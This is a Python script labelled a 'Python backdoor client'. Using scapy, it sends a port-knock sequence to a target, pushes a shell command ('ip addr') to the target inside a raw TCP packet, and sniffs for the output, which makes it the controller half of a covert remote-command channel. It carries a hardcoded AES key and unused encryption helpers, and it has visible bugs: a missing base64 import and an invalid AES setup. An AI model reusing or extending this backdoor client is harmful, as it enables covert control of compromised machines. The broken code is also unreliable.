import argparse
import os
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Crypto.Cipher import AES
MASTER_KEY = "CorrectHorseBatteryStaple"


def encrypt_val(text):
    secret = AES.new(MASTER_KEY[:32])
    tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
    cipher_text = base64.b64encode(secret.encrypt(tag_string))

    return cipher_text


def decrypt_val(cipher):
    secret = AES.new(MASTER_KEY[:32])
    decrypted = secret.decrypt(base64.b64decode(cipher))
    result = decrypted.rstrip("\0")
    return result


def verify_root():
    if(os.getuid() != 0):
        exit("This program must be run with root/sudo")


def send_pkt(packet):
    send(packet)


def knock(destIP, ports):
    for port in ports:
        packet = IP(dst=destIP) / TCP(dport=port)
        send_pkt(packet)


def send_cmd(destIP, port, cmd):
    packet = IP(dst=destIP) / TCP(dport=port) / Raw(load=cmd)
    send_pkt(packet)


def print_result(packet):
    data = packet['Raw'].load
    print(data)


def main():
    verify_root()
    ports = [2525, 14156, 6364]
    knock(args.destIP, ports)
    send_cmd(args.destIP, 3253, "ip addr")
    sniff(filter="tcp and src {} and port 80".format(args.destIP), count=1, prn=print_result)
    print("finished")


if __name__ == '__main__':
    verify_root()
    parser = argparse.ArgumentParser("Python backdoor client")
    parser.add_argument('destIP', help="Destination address")
    parser.add_argument('-s', '--srcport', help="Source port, defaults to 80")
    args = parser.parse_args()
    main()
